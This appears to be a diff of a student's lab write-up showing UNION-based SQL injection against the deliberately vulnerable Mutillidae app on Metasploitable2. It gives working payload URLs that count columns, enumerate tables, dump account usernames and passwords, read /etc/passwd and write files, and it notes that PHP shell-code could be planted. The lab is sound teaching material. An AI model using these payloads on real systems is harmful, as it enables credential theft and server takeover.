@@ -1,8 +1,6 @@
 # sqlinjection
 Exploiting SQL Injection vulnerability
 
-### NAME:- ESWANTH KUMAR K
-### REG NO: 212223040046
 # AIM:
 To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2
 
@@ -79,12 +77,16 @@ The browser url of this info page need to be modified with the url as below:
 http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
 
 ![image](https://github.com/user-attachments/assets/9652a949-19ac-4cb9-9698-733bbccd3093)
+
 After adding the order by 6 into the existing url , the following error statement will be obtained:
 ![image](https://github.com/user-attachments/assets/ab58f46d-3369-4ccb-a3ac-4d8031dec192)
+
 When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
 ![image](https://github.com/user-attachments/assets/05ec7591-ab49-47da-a766-b8eb4c9fc9b5)
+
 As it is having 5 columns the query worked fine and it provides the correct result
 ![image](https://github.com/user-attachments/assets/b065cff4-9ca9-4d25-a995-250c2a114333)
+
 Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union
 ![image](https://github.com/user-attachments/assets/58b074e6-64cb-49f0-afd0-4403273e742b)
 
@@ -95,12 +97,14 @@ Now we will substitute some few commands like database(), user(), version() to o
 
 http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
 ![image](https://github.com/user-attachments/assets/28bb9041-6729-418f-ae5b-442565461341)
+
 The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.
 
 Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
 
 http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
 ![image](https://github.com/user-attachments/assets/a20508d4-9161-4857-afe9-9b91df6c37b1)
+
 The url once executed will retrieve table names from the “owasp 10” database.
 
 ## Extracting sensitive data such as passwords
@@ -119,11 +123,13 @@ The column names of the accounts is displayed below for the following url:
 
 http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
 ![image](https://github.com/user-attachments/assets/a674c2a2-6f98-4366-816c-136f8253813e)
+
 Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.
 
 ## Ex: (union select 1,username,password,is_admin,5 from accounts).
 
 http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
+
 ![image](https://github.com/user-attachments/assets/07a66e96-cfe9-4f5c-af59-a7421dab323d)
 Reading and writing files on the web-server
 We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.
@@ -132,6 +138,7 @@ We can use the “LOAD_FILE()” operator to peruse the contents of any file con
 
 http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
 ![image](https://github.com/user-attachments/assets/d2729d6f-16d5-43a9-af96-3dd70a2f29f5)
+
 the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).
 ## RESULT:
 The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
